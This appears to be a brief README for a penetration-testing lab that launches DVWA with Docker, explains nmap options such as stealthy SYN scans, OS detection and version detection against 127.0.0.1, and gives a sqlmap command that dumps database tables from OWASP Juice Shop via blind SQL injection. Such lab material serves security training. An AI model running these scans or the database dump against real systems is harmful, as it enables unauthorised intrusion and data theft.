## To initiate the environment, run the following command:
``` bash
docker compose -f dvwa_compose.yml up -d
```



### Nmap Scanning for Pentesters

### To scan networks, identify open ports, services, and vulnerabilities. It helps in gathering crucial information for attack planning.

#### Key Nmap Options:
- **`-sS` (SYN Scan)**: Performs a stealthy scan, sending SYN packets to detect open ports without completing a full TCP handshake, useful for avoiding detection.
- **`-sV` (Service Version Detection)**: Identifies the software version running on detected ports, crucial for finding outdated or vulnerable services.
- **`-O` (OS Detection)**: Attempts to determine the target's operating system, which is important for tailoring specific exploits or attacks.
- **`-p` (Port Range)**: Allows scanning of specific port ranges (e.g., `-p 80,443` for web services), optimizing scan time by focusing on critical ports.

#### Example Nmap Commands (using `127.0.0.1` as target IP):
- **Basic scan**: `nmap 127.0.0.1`
- **SYN scan on all ports**: `nmap -sS -p 1-65535 127.0.0.1`
- **Service version detection**: `nmap -sV 127.0.0.1`
- **OS detection**: `nmap -O 127.0.0.1`
- **Scan specific ports**: `nmap -p0-1000 127.0.0.1`




## To crack the juice shop, run the following command:
``` bash
python3 sqlmap-dev/sqlmap.py -r juice_shop_login_query.txt --ignore-code=401 --level=5 --risk=3 --technique=B --dbms=sqlite --dump --tables --threads 5;
```

